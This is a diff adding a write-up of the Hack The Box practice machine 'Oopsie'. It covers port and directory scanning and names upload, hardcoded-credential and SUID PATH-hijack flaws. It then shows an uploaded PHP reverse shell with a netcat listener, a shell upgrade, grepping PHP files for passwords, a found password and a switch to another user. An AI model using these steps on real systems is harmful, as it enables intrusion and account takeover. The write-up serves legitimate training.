@@ -1,0 +1,80 @@
+Hack The Box – Oopsie
+
+1. General Information
+
+- Machine Name:** Oopsie  
+- IP Address:** <TARGET_IP>  
+- Operating System:** Linux  
+- Tier: Tier 2 
+- Machine Type: Easy  
+
+This machine demonstrates Linux privilege escalation through SUID misconfigurations, web application file upload vulnerabilities, credential disclosure, and PATH hijacking.
+
+2. Enumeration
+ Network Scan
+
+Tool: nmap  
+Command: Standard Nmap scan for common TCP ports
+
+bash
+nmap -sC -sV -Pn {TARGET_IP}
+
+Web Enumeration
+Directory brute-forcing is performed to find hidden paths and files:
+
+gobuster dir -u http://{TARGET_IP}/ \
+-w /usr/share/wordlists/dirbuster/directory-file.txt -x php
+
+Interesting paths discovered:
+
+/uploads/ – allows file uploads
+/cdn-cgi/login/ – contains PHP login files
+
+These directories become the focus for further exploration.
+
+3. Vulnerability Analysis
+
+Identified Vulnerabilities
+
+File upload vulnerability in the web application
+Hardcoded credentials found in PHP files
+SUID binary /usr/bin/bugtracker owned by root
+PATH hijacking vulnerability due to SUID binary calling cat without absolute path
+
+4. Reason It Exists
+
+The file upload feature does not validate or restrict uploaded files
+Sensitive credentials are stored in plaintext inside PHP file
+The SUID binary was misconfigured and does not use absolute paths for system commands
+The combination of SUID and PATH hijacking allows privilege escalation
+
+5. Exploitation
+Initial Access – www-data
+
+Uploaded a PHP reverse shell (reverse.php) to /uploads/:
+Listener on attacker machine:
+
+nc -lvnp 1234
+
+Triggered shell via browser:
+
+http://{TARGET_IP}/uploads/reverse.php
+The shell connects as www-data
+
+Shell Stabilization
+Improved shell with Python:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Enumerated /var/www/html/cdn-cgi/login for hardcoded credentials:
+
+cd /var/www/html/cdn-cgi/login
+cat * | grep -i passw
+
+Found credentials:
+MEGACORP_4dm1n!!
+
+Lateral Movement – robert
+Used password reuse to switch to user robert:
+su robert
+
+
